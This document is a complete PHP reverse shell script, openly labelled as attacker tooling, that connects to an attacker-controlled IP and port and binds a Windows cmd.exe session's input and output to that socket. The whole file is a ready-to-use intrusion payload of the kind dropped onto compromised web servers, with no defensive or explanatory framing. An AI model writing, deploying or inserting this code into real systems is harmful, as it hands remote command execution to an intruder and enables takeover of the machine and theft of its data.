<?php
// Change the IP and port to match your setup
$ip = '127.0.0.1';  // Attacker's IP address
$port = 443;     // Attacker's listening port

// Create a socket and connect to the attacker's machine
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die("Could not create socket: " . socket_strerror(socket_last_error()));
}

if (socket_connect($sock, $ip, $port) === false) {
    die("Could not connect: " . socket_strerror(socket_last_error($sock)));
}

// Redirect input, output, and error to the socket
socket_write($sock, "Connected!\r\n");

$cmd = "cmd.exe";  // The command interpreter for Windows
$shell = proc_open($cmd, [
    0 => $sock,  // STDIN
    1 => $sock,  // STDOUT
    2 => $sock,  // STDERR
], $pipes);

// If the shell is open, keep the connection alive
if (is_resource($shell)) {
    while ($status = proc_get_status($shell)) {
        if (!$status['running']) {
            break;
        }
        usleep(100000);  // Sleep for a bit to avoid high CPU usage
    }
}

// Clean up
proc_close($shell);
socket_close($sock);
?>
